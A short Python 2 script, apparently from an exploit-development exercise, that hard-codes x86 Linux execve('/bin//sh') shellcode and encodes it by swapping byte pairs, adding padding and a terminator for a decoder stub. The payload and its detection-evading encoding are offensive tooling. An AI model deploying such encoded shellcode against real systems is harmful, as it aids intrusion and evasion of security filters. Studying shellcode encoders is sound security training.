#!/usr/bin/python

#Filename: Mirror_Encoder.py 
#Author:  MrSquid
#Purpose: Encode a shellcode by mirroring every 4 bytes


shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80") #Execve-nasm shellcode

shell = ""
shell2 = ""

print 'Encoded shellcode ...'

for x in bytearray(shellcode):  #Add to shell the shellcode as hexadecimal format
	shell += '\\x' + '%02x' % x

shell2 = ""
for i in range(0,4*len(bytearray(shellcode)),8): #Loop which takes 2 bytes and swap its order
	if (len(shell[i+1:i+4]) + len(shell[i+5:i+8]))==6:
		shell2 += "0"+ shell[i+5:i+8] + "," + "0"+shell[i+1:i+4] + ","
	elif (len(shell[i+1:i+4]) + len(shell[i+5:i+8]))==3: #If the length of the shellcode is not even, it is added 0xf0 to make it even. 
		shell2 += "0xf0" + "," + "0"+shell[i+1:i+4] + ","


print shell2 + "0xf0,0xf0" #Marker to finish the decoder

print 'Len shellcode: %d' % len(bytearray(shellcode))

